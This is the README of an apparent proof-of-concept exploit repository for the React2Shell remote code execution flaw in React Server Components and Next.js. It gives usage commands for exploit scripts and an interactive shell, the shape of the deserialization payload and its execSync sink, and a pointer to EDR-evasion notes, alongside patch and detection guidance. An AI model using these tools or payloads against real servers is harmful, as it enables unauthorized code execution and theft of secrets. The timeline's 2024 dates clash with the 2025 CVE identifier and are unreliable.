# CVE-2025-55182 (React2Shell) - Proof of Concept

## ⚠️ SECURITY RESEARCH ONLY

This repository contains a proof of concept for **CVE-2025-55182**, a critical remote code execution vulnerability in React Server Components. This is for **authorized security testing and research purposes only**.

## Vulnerability Overview

- **CVE ID**: CVE-2025-55182
- **Name**: React2Shell
- **CVSS Score**: 10.0 (CRITICAL)
- **Type**: CWE-502 - Deserialization of Untrusted Data
- **Attack Vector**: Network (AV:N)
- **Authentication**: None Required (PR:N)
- **Status**: Active exploitation in the wild

### Affected Versions

**React:**

- 19.0.0
- 19.1.0, 19.1.1
- 19.2.0

**Next.js:**

- 15.0.0 to 15.0.4
- 15.1.0 to 15.1.8
- 15.2.0 to 15.2.5
- 16.0.0 to 16.0.6

## Technical Details

The vulnerability exploits unsafe deserialization in the React Server Components Flight protocol. When a server receives a specially crafted payload, it fails to properly validate the structure before deserializing, allowing attacker-controlled data to manipulate server-side execution.

### Attack Mechanism

1. **Fake Chunk Injection**: Attacker sends a Flight payload with a crafted object mimicking internal Chunk structure
2. **Promise Handler Hijacking**: The fake object includes a custom `then` method
3. **State Manipulation**: React's deserialization attempts to resolve the fake Chunk, triggering the attacker's handler
4. **Code Execution**: Arbitrary JavaScript executes on the server via `process.mainModule.require('child_process')`

## POC Setup

### Prerequisites

- Node.js 18+
- Python 3.x (for exploit script)
- npm or yarn

### Installation

1. **Install dependencies:**

```bash
npm install
```

2. **Start the vulnerable server:**

```bash
npm run dev
```

The server will start on http://localhost:3000

### Vulnerable Application Structure

```
app/
├── page.js              # Main page with ServerForm
├── ServerForm.js        # Client component with form
├── actions.js           # Vulnerable Server Action
└── layout.js            # Root layout
```

## Exploit Tools

This repository provides multiple exploitation tools:

1. **`exploit.py`** - Single-shot command execution
2. **`interactive_exploit.py`** - Legacy interactive shell
3. **`exploit_tool/`** - **Modular interactive shell (recommended)**

> **For detailed guide including interactive shell, upload/download, and EDR evasion techniques, see [more-about-exploit.md](more-about-exploit.md)**

### Running the Exploit

**Modular Interactive Shell (Recommended):**

```bash
# Run interactive shell
python run_exploit.py -t http://localhost:3000

# With custom timeout
python run_exploit.py -t http://localhost:3000 -T 30
```

**Single-shot Command:**

```bash
python3 exploit.py -t http://localhost:3000 -c "whoami"
```

### Options

- `-t, --target`: Target URL (required)
- `-c, --command`: Shell command to execute (default: `id`)
- `--check-only`: Only check if target appears vulnerable

### Examples

**Check if target is vulnerable:**

```bash
python3 exploit.py -t http://localhost:3000 --check-only
```

**Execute arbitrary commands:**

```bash
# Get user info
python3 exploit.py -t http://localhost:3000 -c "id"

# List files
python3 exploit.py -t http://localhost:3000 -c "ls -la"

# Create a file as POC
python3 exploit.py -t http://localhost:3000 -c "touch /tmp/pwned"

# Read environment variables
python3 exploit.py -t http://localhost:3000 -c "env"
```

## Exploit Payload Structure

The exploit uses multipart form-data with:

```
Field "0": Malicious JSON with custom 'then' handler
Field "1": Reference to field 0 ($@0)
Header: Next-Action: x (triggers RSC processing)
```

The payload manipulates the internal `_response` object to execute:

```javascript
process.mainModule.require("child_process").execSync("<command>");
```

## Mitigation

### Immediate Actions

1. **Update React:**

   ```bash
   npm install react@19.3.0 react-dom@19.3.0
   ```

2. **Update Next.js:**
   ```bash
   npm install next@15.2.6  # or latest patched version
   ```

### Patched Versions

- **React**: ≥ 19.3.0
- **Next.js**:
  - ≥ 15.0.5
  - ≥ 15.1.9
  - ≥ 15.2.6
  - ≥ 16.0.7

## Detection

### Indicators of Compromise

- Unexpected POST requests to RSC endpoints with `Next-Action` header
- Multipart form-data payloads with `$@` references
- Suspicious `then` properties in request bodies
- Server-side process execution anomalies

### Network Signatures

```
POST / HTTP/1.1
Next-Action: x
Content-Type: multipart/form-data
...containing {"then":"$@
```

## Timeline

- **December 3, 2024**: Public disclosure
- **December 5, 2024**: Active exploitation observed
- **December 26, 2024**: CISA KEV compliance deadline

## References

- [Official CVE Record](https://www.cve.org/CVERecord?id=CVE-2025-55182)
- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2025-55182)
- [CISA KEV Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
- [Wiz Security Advisory](https://www.wiz.io/blog/critical-vulnerability-in-react-cve-2025-55182)
- [OffSec Technical Analysis](https://www.offsec.com/blog/cve-2025-55182/)

## Disclaimer

This proof of concept is provided for **educational and authorized security testing purposes only**. Unauthorized access to computer systems is illegal. The authors assume no liability for misuse of this information.

**DO NOT:**

- Use this exploit against systems you don't own or have explicit permission to test
- Deploy this in production environments
- Share exploit code without proper context and warnings

## License

MIT License - For Security Research Purposes Only
